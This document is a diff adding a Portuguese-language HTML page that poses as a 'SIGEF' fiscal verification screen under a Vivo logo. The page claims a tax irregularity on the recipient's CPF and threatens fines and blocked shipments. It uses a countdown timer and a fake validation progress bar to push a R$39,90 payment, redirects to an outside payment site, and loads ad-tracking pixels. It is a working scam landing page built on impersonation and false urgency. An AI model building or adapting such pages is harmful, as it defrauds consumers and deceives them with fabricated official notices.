@@ -1,0 +1,231 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+      
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação Fiscal - SIGEF</title>
+  <style>
+    :root {
+      --laranja: #670099;
+      --dourado: #670099;
+      --azul: #670099;
+      --vermelho: #FF2525;
+      --verde: #2e7d32;
+      --cinza: #f5f5f5;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f7f7f7;
+      color: #333;
+    }
+    header {
+      background: #670099;
+      padding: 20px;
+      text-align: center;
+      border-bottom: 1px solid #670099;
+    }
+    header img {
+      height: 42px;
+    }
+    .container {
+      max-width: 700px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 14px;
+      padding: 30px 25px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.07);
+    }
+    .title {
+      font-size: 21px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .title::before {
+      content: "📄";
+      font-size: 24px;
+    }
+    .linha-vertical {
+      position: relative;
+      margin: 30px 0;
+      padding-left: 30px;
+      border-left: 2px solid #ccc;
+    }
+    .etapa {
+      position: relative;
+      margin-bottom: 30px;
+      padding-left: 20px;
+    }
+    .etapa::before {
+      content: "";
+      position: absolute;
+      left: -30px;
+      top: 0;
+      width: 16px;
+      height: 16px;
+      background-color: #ccc;
+      border-radius: 50%;
+      border: 2px solid white;
+      z-index: 2;
+    }
+    .etapa.ok::before {
+      background-color: var(--verde);
+    }
+    .etapa.ativo::before {
+      background-color: var(--vermelho);
+    }
+    .etapa h4 {
+      margin-bottom: 5px;
+      font-size: 15px;
+    }
+    .etapa p {
+      font-size: 13px;
+      color: #666;
+    }
+    .painel {
+      background: #e3f2fd;
+      border-left: 5px solid var(--azul);
+      padding: 18px;
+      border-radius: 10px;
+      color: #0b3f71;
+      margin-bottom: 25px;
+      font-size: 15px;
+    }
+    .tempo {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--vermelho);
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .valor {
+      font-size: 24px;
+      color: var(--laranja);
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .botao {
+      display: block;
+      margin: 0 auto;
+      padding: 16px 35px;
+      font-size: 17px;
+      font-weight: bold;
+      background: linear-gradient(90deg, var(--laranja), var(--dourado));
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .progress {
+      height: 8px;
+      width: 0;
+      background: var(--dourado);
+      border-radius: 5px;
+      margin-top: 12px;
+      transition: width 2.5s ease;
+    }
+  </style>
+  <script>
+    let timeLeft = 300;
+    function startCountdown() {
+      const el = document.getElementById("timer");
+      setInterval(() => {
+        const min = Math.floor(timeLeft / 60);
+        const sec = timeLeft % 60;
+        el.textContent = min + ":" + (sec < 10 ? "0" + sec : sec);
+        if (--timeLeft < 0) timeLeft = 0;
+      }, 1000);
+    }
+
+    function validarPagamento(btn) {
+      btn.innerText = "Validando via SIGEF...";
+      btn.disabled = true;
+      document.getElementById("progress").style.width = "100%";
+      setTimeout(() => {
+        window.location.href = "https://www.seguropagamentos.com.br/verific";
+      }, 2500);
+    }
+
+    window.onload = startCountdown;
+  </script>
+
+<script>
+  window.pixelId = "6800b134ebd4fe5c54b14d47";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  !function(f,b,e,v,n,t,s){
+    if(f.fbq)return;n=f.fbq=function(){
+      n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)
+    };
+    if(!f._fbq)f._fbq=n;
+    n.push=n;
+    n.loaded=!0;
+    n.version='2.0';
+    n.queue=[];
+    t=b.createElement(e);t.async=!0;
+    t.src=v;
+    s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)
+  }(
+    window,
+    document,
+    'script',
+    'https://connect.facebook.net/en_US/fbevents.js'
+  );
+  fbq('init', '598153602790130');
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=598153602790130&ev=PageView&noscript=1"
+  />
+</noscript>
+<!-- End Facebook Pixel Code -->
+</head>
+<body>
+  <header>
+    <img src="images/Vivo-roxo.png" alt="Logo">
+  </header>
+
+  <div class="container">
+    <div class="title">Verificação Fiscal - Sistema SIGEF</div>
+
+    <div class="linha-vertical">
+      <div class="etapa ok">
+        <h4>✅ Pedido Confirmado</h4>
+        <p>O pedido foi registrado e processado com sucesso.</p>
+      </div>
+      <div class="etapa ok">
+        <h4>📁 Documentação Enviada</h4>
+        <p>Todos os arquivos fiscais foram recebidos pelo sistema.</p>
+      </div>
+      <div class="etapa ativo">
+        <h4>🚨 Pendência Fiscal Ativa</h4>
+        <p>Foi detectada uma inconsistência tributária vinculada ao CPF do destinatário.</p>
+      </div>
+    </div>
+
+    <div class="painel">
+      Para concluir a liberação deste pedido, é necessário resolver a pendência fiscal junto ao SIGEF. A não regularização pode gerar multa no CPF e bloqueio de novos envios.
+    </div>
+
+    <div class="valor">R$39,90 </div>
+    <button class="botao" style="box-shadow: 0 4px 15px rgb(103,0,153,0.4);" onclick="validarPagamento(this)">✅ REGULARIZAR AGORA COM CPF</button>
+    <div class="progress" id="progress"></div>
+  </div>
+
+
+</body></html>
